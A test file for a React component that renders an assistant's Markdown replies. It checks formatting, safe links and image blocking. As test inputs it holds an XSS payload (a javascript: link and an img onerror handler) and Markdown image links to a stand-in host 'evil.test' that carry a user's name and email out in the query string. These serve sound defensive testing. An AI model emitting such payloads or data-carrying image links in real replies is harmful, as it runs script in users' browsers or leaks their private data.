/** Verifies assistant replies render Markdown structure safely. */
import { render, screen } from '@testing-library/react'
import { expect, it } from 'vitest'
import { ChatMarkdown } from './ChatMarkdown'

it('renders headings, lists, emphasis, code and tables', () => {
  render(<ChatMarkdown content={'## Next steps\n\n1. **Update** the summary\n2. Add `TypeScript`\n\n| Job | Fit |\n| --- | --- |\n| Acme | Strong |'} />)
  expect(screen.getByRole('heading', { level: 2, name: 'Next steps' })).toBeInTheDocument()
  expect(screen.getAllByRole('listitem')).toHaveLength(2)
  expect(screen.getByText('Update').tagName).toBe('STRONG')
  expect(screen.getByText('TypeScript').tagName).toBe('CODE')
  expect(screen.getByRole('cell', { name: 'Strong' })).toBeInTheDocument()
})

it('opens links in a new tab and drops unsafe targets and raw HTML', () => {
  render(<ChatMarkdown content={'[Posting](https://example.com/job) [bad](javascript:alert(1)) <img src=x onerror="alert(1)">'} />)
  const posting = screen.getByRole('link', { name: 'Posting' })
  expect(posting).toHaveAttribute('href', 'https://example.com/job')
  expect(posting).toHaveAttribute('target', '_blank')
  expect(posting).toHaveAttribute('rel', 'noopener noreferrer')
  expect(screen.getByText('bad').getAttribute('href') ?? '').not.toContain('javascript')
  expect(document.querySelector('img')).toBeNull()
})

it('never loads images from the reply, so an image address cannot carry private data out', () => {
  render(<ChatMarkdown content={'Done ![Summary chart](https://evil.test/p.png?name=Jane+Doe&email=jane@example.com) ![](https://evil.test/pixel.gif)'} />)
  expect(document.querySelector('img')).toBeNull()
  expect(screen.getByText('Summary chart')).toBeInTheDocument()
  expect(document.body.innerHTML).not.toContain('evil.test')
})
